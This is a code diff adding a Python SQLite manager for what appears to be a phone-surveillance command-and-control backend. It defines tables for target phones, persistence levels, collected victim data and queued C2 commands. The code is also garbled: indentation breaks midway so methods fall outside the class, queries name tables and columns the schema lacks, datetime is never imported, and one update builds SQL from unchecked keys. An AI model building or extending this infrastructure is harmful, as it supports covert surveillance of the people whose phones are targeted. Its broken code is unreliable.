@@ -1,0 +1,205 @@
+import sqlite3
+import json
+import os
+from contextlib import contextmanager
+from core.config_manager import ConfigManager
+
+class DatabaseManager:
+    def __init__(self, config_manager: ConfigManager):
+        self.config = config_manager
+        self.db_path = self.config.get('database.path', 'data/surveillance.db')
+
+    @contextmanager
+    def _get_connection(self):
+        conn = sqlite3.connect(self.db_path)
+        conn.row_factory = sqlite3.Row
+        yield conn
+        conn.close()
+
+    def initialize(self):
+        if not os.path.exists(os.path.dirname(self.db_path)):
+            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
+
+    def create_tables(self):
+        with self._get_connection() as conn:
+            cursor = conn.cursor()
+            
+            cursor.execute('''
+            CREATE TABLE IF NOT EXISTS sessions (
+                session_id TEXT PRIMARY KEY,
+                target_phone TEXT,
+                target_os TEXT,
+                target_app TEXT,
+                status TEXT,
+                persistence_level TEXT,
+                created_at TEXT,
+                metadata TEXT
+            )
+            ''')
+
+            cursor.execute('''
+            CREATE TABLE IF NOT EXISTS collected_data (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                session_id TEXT,
+                data_type TEXT,
+                payload TEXT,
+                timestamp TEXT,
+                metadata TEXT,
+                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
+            )
+            ''')
+
+            cursor.execute('''
+            CREATE TABLE IF NOT EXISTS c2_commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                session_id TEXT,
+                command TEXT,
+                status TEXT,
+                created_at TEXT,
+                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
+            )
+            ''')
+            
+            conn.commit()
+
+    def insert_session(self, session_data: dict):
+        with self._get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO sessions (session_id, target_phone, target_os, target_app, status, persistence_level, created_at, metadata)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                session_data['session_id'],
+                session_data['target_phone'],
+                session_data['target_os'],
+                session_data['target_app'],
+                session_data['status'],
+                session_data.get('persistence_level'),
+                session_data['created_at'],
+                json.dumps({k:v for k,v in session_data.items() if k not in ['session_id', 'created_at']})
+            ))
+            conn.commit()
+
+    def update_session(self, session_id: str, updates: dict):
+        with self._get_connection() as conn:
+            cursor = conn.cursor()
+            set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
+            values = list(updates.values()) + [session_id]
+            cursor.execute(f"UPDATE sessions SET {set_clause} WHERE session_id = ?", values)
+            conn.commit()
+
+    def get_session(self, session_id: str):
+        with self._get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
+            return dict(cursor.fetchone())
+
+    def get_active_sessions(self) -> list:
+        with self._get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT * FROM sessions WHERE status = 'active'")
+            return [dict(row) for row in cursor.fetchall()]
+
+    def get_pending_commands(self, session_id):
+            """Get pending commands for a session"""
+    try:
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                SELECT id, command, created_at FROM commands
+                WHERE session_id = ? AND status = 'pending'
+                ORDER BY created_at ASC
+            """, (session_id,))
+            
+            rows = cursor.fetchall()
+            commands = []
+            for row in rows:
+                commands.append({
+                    'id': row[0],
+                    'command': row[1],
+                    'created_at': row[2]
+                })
+            
+            return commands
+    except Exception as e:
+        print(f"Error getting pending commands: {e}")
+        return []
+
+def update_command_status(self, command_id, status):
+    """Update command status"""
+    try:
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                UPDATE commands
+                SET status = ?, updated_at = ?
+                WHERE id = ?
+            """, (status, datetime.datetime.now().isoformat(), command_id))
+            
+            conn.commit()
+            return True
+    except Exception as e:
+        print(f"Error updating command status: {e}")
+        return False
+
+def insert_collected_data(self, session_id, data_type, payload, metadata=None):
+    """Insert collected data into the database"""
+    try:
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                INSERT INTO collected_data
+                (session_id, data_type, payload, metadata, created_at)
+                VALUES (?, ?, ?, ?, ?)
+            """, (
+                session_id,
+                data_type,
+                payload,
+                json.dumps(metadata) if metadata else None,
+                datetime.datetime.now().isoformat()
+            ))
+            
+            conn.commit()
+            return cursor.lastrowid
+    except Exception as e:
+        print(f"Error inserting collected data: {e}")
+        return None
+
+def get_collected_data(self, session_id, data_type=None, limit=100):
+    """Get collected data for a session"""
+    try:
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            
+            if data_type:
+                cursor.execute("""
+                    SELECT id, data_type, payload, metadata, created_at
+                    FROM collected_data
+                    WHERE session_id = ? AND data_type = ?
+                    ORDER BY created_at DESC
+                    LIMIT ?
+                """, (session_id, data_type, limit))
+            else:
+                cursor.execute("""
+                    SELECT id, data_type, payload, metadata, created_at
+                    FROM collected_data
+                    WHERE session_id = ?
+                    ORDER BY created_at DESC
+                    LIMIT ?
+                """, (session_id, limit))
+            
+            rows = cursor.fetchall()
+            data = []
+            for row in rows:
+                data.append({
+                    'id': row[0],
+                    'data_type': row[1],
+                    'payload': row[2],
+                    'metadata': json.loads(row[3]) if row[3] else None,
+                    'created_at': row[4]
+                })
+            
+            return data
+    except Exception as e:
+        print(f"Error getting collected data: {e}")
+        return []
